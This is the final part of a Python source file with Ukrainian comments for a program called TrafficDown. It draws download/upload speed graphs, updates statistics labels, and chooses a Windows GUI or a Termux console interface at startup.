            self.canvas.configure(bg=self.THEME["canvas_bg"][1] if is_dark else self.THEME["canvas_bg"][0])

            # "Розумна" шкала Y
            max_val = max(max(self.dl_history), max(self.ul_history), 10)
            if max_val <= 10: max_y = 10
            elif max_val <= 50: max_y = 50
            elif max_val <= 100: max_y = 100
            else: max_y = (int(max_val / 50) + 1) * 50
            
            # Малюємо сітку та підписи
            for i in range(1, 5):
                y = h*i/5; self.canvas.create_line(0, y, w, y, fill=grid_c, dash=(2,4))
                self.canvas.create_text(25, y, text=f"{max_y*(5-i)/5:.0f}", fill=text_c, anchor="e")
            self.canvas.create_text(25, 10, text="MB/s", fill=text_c, anchor="e")

            # Легенда
            self.canvas.create_rectangle(w-130,10,w-115,25,fill=self.THEME["dl_color"], outline="")
            self.canvas.create_text(w-110, 18, text="Download", fill=text_c, anchor="w")
            self.canvas.create_rectangle(w-130,30,w-115,45,fill=self.THEME["ul_color"], outline="")
            self.canvas.create_text(w-110, 38, text="Upload", fill=text_c, anchor="w")

            def plot(hist: list, color: str):
                if len(hist) > 1:
                    pts = [(w*i/(len(hist)-1), h-(h*min(v, max_y)/max_y if max_y > 0 else 0)) for i,v in enumerate(hist)]
                    self.canvas.create_line(pts, fill=color, width=2.5, smooth=True)
            plot(self.ul_history, self.THEME["ul_color"])
            plot(self.dl_history, self.THEME["dl_color"])

        def update_loop(self) -> None:
            """Головний цикл оновлення GUI."""
            if not self.root.winfo_exists(): return
            
            stats = engine.get_stats(); now = time.time(); delta = max(now - self.last_t, 1e-6)
            sdl = (stats['dl']-self.last_dl)/delta/1024**2; sul = (stats['ul']-self.last_ul)/delta/1024**2
            self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now
            
            self.dl_history.append(max(0,sdl)); self.dl_history.pop(0)
            self.ul_history.append(max(0,sul)); self.ul_history.pop(0)

            dl_gb, ul_gb = stats['dl']/1024**3, stats['ul']/1024**3
            
            self.lbl_dl_speed.configure(text=f"{sdl:.1f} MB/s"); self.lbl_dl_total.configure(text=f"Total: {dl_gb:.2f} GB")
            self.lbl_ul_speed.configure(text=f"{sul:.1f} MB/s"); self.lbl_ul_total.configure(text=f"Total: {ul_gb:.2f} GB")
            self.lbl_mode.configure(text=f"MODE: {stats['mode']}"); self.lbl_total_traffic.configure(text=f"TOTAL: {dl_gb+ul_gb:.2f} GB")
            self.lbl_errors_count.configure(text=f"ERRORS: {stats['err']}")
            if not self.status_message_job: self.lbl_status.configure(text=stats['last_error'])
            
            if self.root.winfo_viewable() and self.dashboard_tab.winfo_ismapped(): self.draw_graph()
            
            self.update_buttons()
            self.root.after(500, self.update_loop)

        def run(self) -> None:
            """Запускає головний цикл GUI."""
            self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
            self.root.mainloop()

        def on_closing(self) -> None:
            """Коректно завершує роботу при закритті вікна."""
            log.info("Отримано запит на закриття вікна. Зупинка...")
            engine.stop()
            self.root.destroy()

# --- 5. ГОЛОВНА ТОЧКА ВХОДУ ---
if __name__ == "__main__":
    try:
        # Вибираємо інтерфейс залежно від системи та наявності бібліотек
        if IS_WINDOWS and GUI_AVAILABLE:
            log.info("Запуск графічного інтерфейсу для Windows.")
            app = WindowsGUI()
            app.run()
        else:
            if IS_WINDOWS and not GUI_AVAILABLE: log.warning("Не вдалося завантажити customtkinter. Перехід до консольного режиму.")
            log.info("Запуск консольного інтерфейсу.")
            app = TermuxUI()
            app.run()
    except KeyboardInterrupt:
        log.info("Програму зупинено користувачем (Ctrl+C).")
    except Exception as e:
        log.critical(f"Виникла неперехоплена глобальна помилка: {e}", exc_info=True)
    finally:
        log.info("Завершення роботи. Зупиняємо всі активні процеси...")
        engine.stop()
        print("\nTrafficDown завершив роботу. До побачення!")
        # os._exit(0) примусово завершує всі потоки, що є надійним для такого типу додатків.
        os._exit(0)

